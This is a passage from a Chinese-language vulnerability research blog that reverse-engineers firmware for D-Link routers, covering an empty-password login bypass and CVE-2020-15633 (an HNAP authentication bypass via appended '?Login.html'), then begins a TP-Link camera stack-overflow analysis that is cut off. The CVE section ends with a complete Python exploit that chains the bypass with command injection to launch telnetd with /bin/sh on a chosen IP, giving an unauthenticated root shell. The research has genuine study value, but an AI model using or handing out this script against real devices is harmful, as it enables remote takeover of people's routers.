= <span class="built_in">strlen</span>(acStack544);</span><br><span class="line">      FUN_0001fd40(&amp;local_60,<span class="number">0x14</span>,acStack544,sVar3,&amp;local_23c);</span><br><span class="line">      pbVar5 = (byte *)((<span class="type">int</span>)&amp;local_240 + <span class="number">3</span>);</span><br><span class="line">      pbVar6 = pbVar5;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        pbVar6 = pbVar6 + <span class="number">1</span>;</span><br><span class="line">        iVar2 = <span class="built_in">sprintf</span>((<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_184 + iVar1),<span class="string">&quot;%02x&quot;</span>,(uint)*pbVar6);</span><br><span class="line">        iVar1 = iVar1 + iVar2;</span><br><span class="line">      &#125; <span class="keyword">while</span> (pbVar6 != (byte *)((<span class="type">int</span>)&amp;local_230 + <span class="number">3</span>));</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;private_key is = %s\n&quot;</span>,&amp;local_184);</span><br><span class="line">      FUN_0001f4f4(&amp;local_184,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/private_key&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      iVar1 = <span class="number">0</span>;</span><br><span class="line">      local_23c = <span class="number">0</span>;</span><br><span class="line">      local_238 = <span class="number">0</span>;</span><br><span class="line">      local_234 = <span class="number">0</span>;</span><br><span class="line">      local_230 = <span class="number">0</span>;</span><br><span class="line">      FUN_0001fd40(&amp;local_60,<span class="number">0x14</span>,&amp;local_184,<span class="number">0x20</span>,&amp;local_23c);</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        pbVar5 = pbVar5 + <span class="number">1</span>;</span><br><span class="line">        iVar2 = <span class="built_in">sprintf</span>(acStack352 + iVar1,<span class="string">&quot;%02x&quot;</span>,(uint)*pbVar5);</span><br><span class="line">        iVar1 = iVar1 + iVar2;</span><br><span class="line">      &#125; <span class="keyword">while</span> (pbVar5 != (byte *)((<span class="type">int</span>)&amp;local_230 + <span class="number">3</span>));</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;password_md5 = %s\n&quot;</span>,acStack352);</span><br><span class="line">      FUN_0001f4f4(acStack352,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/password_md5&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_25c,<span class="number">0x1f</span>,<span class="string">&quot;%d&quot;</span>,local_29c);</span><br><span class="line">      FUN_0001f4f4(&amp;local_25c,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/time&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过交叉引用发现调用此函数的位置是处理 http 请求的主函数，内容较多这里就不贴代码了，大概逻辑就是匹配 http 请求的各个字段然后采取不同的操作，从上面的代码中我们可以发现 password_md5 文件内容似乎是从用户请求中取得的，我猜测是用户点击登录按钮之后会通过 php 代码计算出某些必要的数据，然后传递给 httpd 解析并保存到对应的文件中，之后在 __login.php 中进行验证，这样来看，一旦用户手动清空 password_md5  对应字段的内容，那么将导致 $password_d 变量为空，验证密码的逻辑就变成了</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$LOGIN_PASSWD</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$password_d</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$LOGIN_PASSWD</span> == <span class="variable">$password_d</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Fail!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这样就可以绕过正常的登录验证，顺利进入后台。</p>
<p>官方的修复手段就是先判断 $password_d 是否为空，然后才进行比较。</p>
<h1 id="CVE-2020-15633"><a href="#CVE-2020-15633" class="headerlink" title="CVE-2020-15633"></a>CVE-2020-15633</h1><p>2020 年 7 月 20 日，ZDI 披露了 Dlink DIR 系列路由器的一个身份验证绕过漏洞，此漏洞影响多个不同的路由器设备，攻击者通过构造特殊的 HTTP 请求即可触发漏洞，绕过登录验证逻辑，直接访问敏感接口。</p>
<h2 id="漏洞基本信息-2"><a href="#漏洞基本信息-2" class="headerlink" title="漏洞基本信息"></a>漏洞基本信息</h2><p>以下是从披露页面摘抄的漏洞信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DIR-867, DIR-878, and DIR-882 routers. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of HNAP requests. The issue results from incorrect string matching logic when accessing protected pages. An attacker can leverage this vulnerability to escalate privileges and execute code in the context of the router.</span><br></pre></td></tr></table></figure></div>

<p>此漏洞影响 DIR-867, DIR-878, DIR-882 路由器，漏洞产生原因大概是在处理 HNAP 请求过程中，验证用户登录的逻辑存在问题，导致攻击者可以构造特殊的 HTTP 请求绕过身份验证，从而访问敏感 API 接口。</p>
<p>漏洞类型：身份验证绕过</p>
<p>漏洞威胁：较高 (8.8)</p>
<p>漏洞影响：攻击者绕过身份验证，从而访问敏感 API，执行敏感操作。</p>
<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>以 DIR-878 路由器为例，固件下载地址：<a class="link"   href="ftp://ftp2.dlink.com/PRODUCTS/DIR-878/REVA/" >ftp://ftp2.dlink.com/PRODUCTS/DIR-878/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>请下载 1.20B05 版本，此漏洞在最新版中已经修复。</p>
<p>DIR 878 路由器的固件经过加密，binwalk 无法直接解包，解包手段可以参考  <a href="https://wzt.ac.cn/2019/09/18/D-Link_BUG/">https://wzt.ac.cn/2019/09/18/D-Link_BUG/</a></p>
<p>解包之后找到关键文件 prog.cgi，此文件负责解析和处理 HTTP 请求。将它加载到 Ghidra 中即可开始分析。</p>
<p>根据披露信息，触发此漏洞的手段是在正常的 HNAP 请求后面添加 ‘?GetCAPTCHAsetting’，添加之后将数据包发送给路由器即可绕过身份验证从而访问任意的 API 接口。于是利用字符串搜索功能在目标文件中查找字符串 GetCAPTCHAsetting，得到几条交叉引用信息，其中位于 004d01a0 位置的字符串是我们重点关注的对象。</p>
<p>双击来到目标地址，发现如下信息：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">                             PTR_DAT_004d0194                                XREF[3]:     FUN_0041d81c:0041d928 (R) , </span><br><span class="line">                                                                                          FUN_0041d81c:0041da04 (R) , </span><br><span class="line">                                                                                          websWriteBlockWithTranslation:00</span><br><span class="line">        004d0194 e4  48  4b  00    addr       DAT_004b48e4                                     = 23h    #</span><br><span class="line">        004d0198 00              ??         00h</span><br><span class="line">        004d0199 00              ??         00h</span><br><span class="line">        004d019a 00              ??         00h</span><br><span class="line">        004d019b 00              ??         00h</span><br><span class="line">        004d019c 00              ??         00h</span><br><span class="line">        004d019d 00              ??         00h</span><br><span class="line">        004d019e 00              ??         00h</span><br><span class="line">        004d019f 00              ??         00h</span><br><span class="line">        004d01a0 47  65  74       ds         &quot;GetCAPTCHAsetting&quot;</span><br><span class="line">                 43  41  50 </span><br><span class="line">                 54  43  48 </span><br><span class="line">        004d01b4 00              ??         00h</span><br><span class="line">        004d01b5 00              ??         00h</span><br><span class="line">        004d01b6 00              ??         00h</span><br><span class="line">        004d01b7 00              ??         00h</span><br><span class="line">        004d01b8 00              ??         00h</span><br><span class="line">        004d01b9 00              ??         00h</span><br><span class="line">        004d01ba 00              ??         00h</span><br><span class="line">        004d01bb 00              ??         00h</span><br><span class="line">        004d01bc 00              ??         00h</span><br><span class="line">        004d01bd 00              ??         00h</span><br><span class="line">        004d01be 00              ??         00h</span><br><span class="line">        004d01bf 00              ??         00h</span><br><span class="line">        004d01c0 47  65  74       ds         &quot;GetDeviceSettings&quot;</span><br><span class="line">                 44  65  76 </span><br><span class="line">                 69  63  65 </span><br><span class="line">        004d01d4 00              ??         00h</span><br><span class="line">        004d01d5 00              ??         00h</span><br><span class="line">        004d01d6 00              ??         00h</span><br><span class="line">        004d01d7 00              ??         00h</span><br><span class="line">        004d01d8 00              ??         00h</span><br><span class="line">        004d01d9 00              ??         00h</span><br><span class="line">        004d01da 00              ??         00h</span><br><span class="line">        004d01db 00              ??         00h</span><br><span class="line">        004d01dc 00              ??         00h</span><br><span class="line">        004d01dd 00              ??         00h</span><br><span class="line">        004d01de 00              ??         00h</span><br><span class="line">        004d01df 00              ??         00h</span><br><span class="line">        004d01e0 62  6c  6f       ds         &quot;blockedPage.html&quot;</span><br><span class="line">                 63  6b  65 </span><br><span class="line">                 64  50  61 </span><br><span class="line">........</span><br></pre></td></tr></table></figure></div>

<p>类似于许多字符串的集合，并且两两之间偏移量都是 0x20。猜测此处是某种字符串列表，通过 PTR_DAT_004d0194 加上偏移量进行索引。</p>
<p>我们还可以使用 IDA 进行进一步的验证，将 prog.cgi 加载到 IDA 中，跳转到目标地址得到以下信息：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:004D01A0 aGetcaptchasett:.ascii &quot;GetCAPTCHAsetting&quot;&lt;0&gt;</span><br><span class="line">.data:004D01A0                                          # DATA XREF: sub_423ECC+D8↑o</span><br><span class="line">.data:004D01A0                                          # sub_423ECC+12C↑o ...</span><br><span class="line">.data:004D01B2                 .align 4</span><br><span class="line">.data:004D01C0 aGetdevicesetti_3:.ascii &quot;GetDeviceSettings&quot;&lt;0&gt;</span><br><span class="line">.data:004D01D2                 .align 4</span><br><span class="line">.data:004D01E0 aBlockedpageHtm:.ascii &quot;blockedPage.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D01F1                 .align 4</span><br><span class="line">.data:004D0200 aMobileloginHtm:.ascii &quot;MobileLogin.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D0211                 .align 4</span><br><span class="line">.data:004D0220 aLoginHtml:     .ascii &quot;Login.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D022B                 .align 5</span><br><span class="line">.data:004D0240 aEulaHtml:      .ascii &quot;EULA.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D024A                 .align 5</span><br><span class="line">.data:004D0260 aIndexHtml_2:   .ascii &quot;Index.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D026B                 .align 5</span><br><span class="line">.data:004D0280 aWizardHtml:    .ascii &quot;Wizard.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D028C                 .align 5</span><br><span class="line">.data:004D02A0 aHnap1_5:       .ascii &quot;/HNAP1/&quot;&lt;0&gt;</span><br><span class="line">.data:004D02A8                 .align 5</span><br><span class="line">.data:004D02C0 aEulaTermHtml:  .ascii &quot;EULA_Term.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D02CF                 .align 5</span><br><span class="line">.data:004D02E0 aEulaPrivacyHtm:.ascii &quot;EULA_Privacy.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D02F2                 .align 4</span><br></pre></td></tr></table></figure></div>

<p>IDA 对这部分数据识别的更加准确，正如我们的猜测，这里是一个字符串列表。</p>
<p>通过对列表首部地址的交叉引用，能找到使用这部分数据的代码，其中最关键的函数是 00423ecc，反编译结果如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">allow_urls</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *pcVar2;</span><br><span class="line">  uint uri_index;</span><br><span class="line">  <span class="type">char</span> acStack2092 [<span class="number">1024</span>];</span><br><span class="line">  <span class="type">char</span> acStack1068 [<span class="number">1024</span>];</span><br><span class="line">  undefined auStack44 [<span class="number">40</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(acStack2092,<span class="number">0</span>,<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack1068,<span class="number">0</span>,<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(auStack44,<span class="string">&quot;&lt;title&gt;401 Not Authorized&lt;/title&gt;\r\n&quot;</span>,<span class="number">0x24</span>);</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(param_1 + <span class="number">0xe4</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    uri_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (uri_index &lt; <span class="number">0xb</span>) &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(acStack2092,<span class="number">0x400</span>,<span class="string">&quot;%s%s&quot;</span>,<span class="string">&quot;http://purenetworks.com/HNAP1/&quot;</span>,</span><br><span class="line">               s_GetCAPTCHAsetting_004d01a0 + uri_index * <span class="number">0x20</span>);</span><br><span class="line">      <span class="built_in">snprintf</span>(acStack1068,<span class="number">0x400</span>,<span class="string">&quot;\&quot;%s%s\&quot;&quot;</span>,<span class="string">&quot;http://purenetworks.com/HNAP1/&quot;</span>,</span><br><span class="line">               s_GetCAPTCHAsetting_004d01a0 + uri_index * <span class="number">0x20</span>);</span><br><span class="line">      <span class="keyword">if</span> ((*(<span class="type">int</span> *)(param_1 + <span class="number">0xe4</span>) == <span class="number">0</span>) ||</span><br><span class="line">         (pcVar2 = <span class="built_in">strstr</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xe4</span>),s_GetCAPTCHAsetting_004d01a0 + uri_index *<span class="number">0x20</span></span><br><span class="line">                         ), pcVar2 == (<span class="type">char</span> *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*(<span class="type">int</span> *)(param_1 + <span class="number">0xd4</span>) != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">           ((iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xd4</span>),acStack2092), iVar1 == <span class="number">0</span> ||</span><br><span class="line">            (iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xd4</span>),acStack1068), iVar1 == <span class="number">0</span>)))) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        iVar1 = <span class="built_in">strcmp</span>(s_GetCAPTCHAsetting_004d01a0 + uri_index * <span class="number">0x20</span>,<span class="string">&quot;/HNAP1/&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (((iVar1 != <span class="number">0</span>) || (*(<span class="type">int</span> *)(param_1 + <span class="number">200</span>) == <span class="number">0</span>)) ||</span><br><span class="line">           (iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">200</span>),<span class="string">&quot;POST&quot;</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      uri_index = uri_index + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((*(<span class="type">int</span> *)(param_1 + <span class="number">0x110</span>) == <span class="number">0</span>) ||</span><br><span class="line">     ((iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0x110</span>),<span class="string">&quot;QRSMobile&quot;</span>,<span class="number">9</span>), iVar1 != <span class="number">0</span> &amp;&amp;</span><br><span class="line">      ((pcVar2 = <span class="built_in">strstr</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0x110</span>),<span class="string">&quot;Android&quot;</span>), pcVar2 == (<span class="type">char</span> *)<span class="number">0x0</span> ||</span><br><span class="line">       (iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0x110</span>),<span class="string">&quot;Mozilla&quot;</span>,<span class="number">7</span>), iVar1 == <span class="number">0</span>)))))) &#123;</span><br><span class="line">    iVar1 = FUN_0042159c(param_1);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">       ((*(<span class="type">int</span> *)(param_1 + <span class="number">200</span>) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">200</span>),<span class="string">&quot;POST&quot;</span>), iVar1 == <span class="number">0</span>)))) &#123;</span><br><span class="line">      FUN_00424498(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      websDefaultHandler(param_1,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;/Index.html&quot;</span>,<span class="string">&quot;/Index.html&quot;</span>,*(undefined4 *)(param_1 +<span class="number">0xf8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    websRspNotAuth(param_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数接收的参数是 webs_t 结构体，用于代表一个 web 请求。可以通过不断的交叉引用找到源函数 websSecurityHandler，gohead 中同名函数描述如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">websSecurityHandler implements the default security policy. It operates as a URL handler and is installed to run as the very first URL handler. If you require a replacement security policy, delete the websSecurityHandler and install your own with websUrlHandlerDefine.</span><br></pre></td></tr></table></figure></div>

<p>简单分析上面提到的函数逻辑，发现他会取出 webs_t 中下标为 0xe4 的数据并判断字符串列表中的数据是否出现在其中。通过分析 main 函数可以确定，0xe4 位置存放的是 Request_URI 指针，表示用户访问的 URL 链接。</p>
<p>如果字符串列表中的数据出现在 Request_URI 中，则允许访问。进一步分析发现这些硬编码的接口默认都是不需要身份验证就能访问的。例如 Login.html 是登录接口，EULA.html 是用户隐私协议等。</p>
<p>此函数的问题在于，它使用了 strstr 函数对用户输入的数据进行判断，如果用户访问一个本来需要身份验证的链接，然后在链接的后面添加这些字符串即可绕过身份验证逻辑。</p>
<p>漏洞测试：</p>
<p>首先抓包获取一个需要身份验证的 HTTP 请求：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /HNAP1/ HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">Content-Length: 302</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">HNAP_AUTH: 00DAB25BFD3EBF8FAD03E60E5616BF44 1598580346156</span><br><span class="line">SOAPAction: &quot;http://purenetworks.com/HNAP1/GetIPv6Status&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Content-Type: text/xml; charset=UTF-8</span><br><span class="line">Origin: http://192.168.0.1</span><br><span class="line">Referer: http://192.168.0.1/Home.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: uid=uFXfaJBA</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;GetIPv6Status xmlns=&quot;http://purenetworks.com/HNAP1/&quot; /&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>

<p>这个请求发送到路由器可以返回正常的结果。然后构造一个非法的请求，在访问链接中添加 ‘?Login.html’：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/aubypass-2.png"
                     
                ></p>
<p>可以看到构造的恶意 payload 能够绕过身份验证直接访问敏感接口。</p>
<p>此外我们可以结合这个身份验证漏洞以及<a href="https://wzt.ac.cn/2019/09/18/D-Link_BUG/">命令注入漏洞</a>实现无条件的 RCE。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">telnet_payload = <span class="string">r&quot;1.com/&amp;amp;$(telnetd$IFS$9-l$IFS$9/bin/sh$IFS$9-b$IFS$9&#x27;0.0.0.0&#x27;)&amp;amp;&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;uid&quot;</span>: <span class="string">&quot;CataLpa&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/xml&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;SOAPACTION&quot;</span>: <span class="string">&quot;\&quot;http://purenetworks.com/HNAP1/SetWebFilterSettings\&quot;&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/xml&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">burp0_data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;soap:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot; xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot; xmlns:soap=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;&gt;\n&lt;soap:Body&gt;\n&lt;SetWebFilterSettings&gt;\n\t&lt;WebFilterMethod&gt;DENY&lt;/WebFilterMethod&gt;\n\t&lt;NumberOfEntry&gt;1&lt;/NumberOfEntry&gt;\n\t&lt;WebFilterURLs&gt;\n\t\t&lt;string&gt;&quot;</span> + telnet_payload + <span class="string">&quot;&lt;/string&gt;\n\t&lt;/WebFilterURLs&gt;\n&lt;/SetWebFilterSettings&gt;\n&lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Usage: python DIR-878.py &lt;ip&gt;&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    IP = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Send payload to &quot;</span> + IP)</span><br><span class="line">    burp0_url = <span class="string">&quot;http://&quot;</span> + IP + <span class="string">&quot;:80/HNAP1/?Login.html&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;200&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(res.status_code):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Exploit success!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] telnet &quot;</span> + IP)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Exploit failed. Bug fixed :(&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Exploit failed.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>TP-Link IP43AN</title>
    <url>/2020/05/23/IPC43AN/</url>
    <content><![CDATA[<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>首先获取摄像头的固件，下载地址： <a class="link"   href="https://service.tp-link.com.cn/detail_download_7631.html" >https://service.tp-link.com.cn/detail_download_7631.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<span id="more"></span>

<p>固件本身没有加密，可以直接使用 binwalk 解开，解开之后得到一个标准的 linux 文件系统，存在漏洞的文件是 &#x2F;usr&#x2F;bin&#x2F;dsd。此二进制文件是 32bit ARM 架构的，IDA 可以直接进行反编译，但是在实际操作中，IDA 的交叉引用识别上面存在一定的问题，所以推荐搭配 Ghidra 使用。</p>
<p>在分析之前需要介绍一下如何才能定位关键文件。摄像头之类的设备一般都存在 web 管理界面，所以拿到固件之后可以先尝试寻找包含 http 字样的 web server，某些设备考虑到性能等问题，可能会把所有逻辑集成在一个二进制文件中，而其他一些设备性能较强，或者应用了某些框架，则会把 web 服务器和具体的业务逻辑分散开。</p>
<p>本例中 web 服务器位于 &#x2F;usr&#x2F;sbin&#x2F;uhttpd，它负责解析 web 请求，以及一部分设备功能。通过进一步分析此程序，可以发现更多的业务逻辑(主要和设备的参数设置相关)被放置在了 &#x2F;usr&#x2F;bin&#x2F;dsd 中，所以 dsd 文件就是我们的主要分析对象。</p>
<p>IDA 直接打开 dsd 文件，可以通过搜索字符串的方式尝试定位关键函数，也可以结合抓包手段拿到一些关键的字符串信息，经过分析，发现关键函数是 0x155FC，抓包样本：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /stok=9ffcd0b497aa1902380ea5d5e1ee2eea/ds HTTP/1.1</span><br><span class="line">Host: 192.168.3.20</span><br><span class="line">Content-Length: 326</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.3.20</span><br><span class="line">Referer: http://192.168.3.20/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;system&quot;:&#123;&quot;config_recovery&quot;:&#123;&#125;,&quot;method&quot;:&quot;do&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>函数的几个关键信息：</p>
<ol>
<li>处理的数据是 json 格式，基本参数包括 method、request</li>
<li>函数根据不同的 method 会做不同的处理，具体包含 get、add、delete、set、do</li>
<li>处理逻辑类似于 switch case 结构，根据不同的 request 调用不同的 handler。</li>
</ol>
<p>关键的代码片段：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( (v33 - <span class="number">1</span>) &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*&amp;aDsHandleMethod[<span class="number">4</span> * v33 + <span class="number">644</span>])(v3) )<span class="comment">// 根据 method 决定调用哪个 handler</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_signal_handle&quot;</span>, <span class="number">3148</span>);</span><br><span class="line">      v32 = <span class="string">&quot;Signal handle failed.&quot;</span>;</span><br><span class="line">LABEL_81:</span><br><span class="line">      <span class="built_in">printf</span>(v32);</span><br><span class="line">      <span 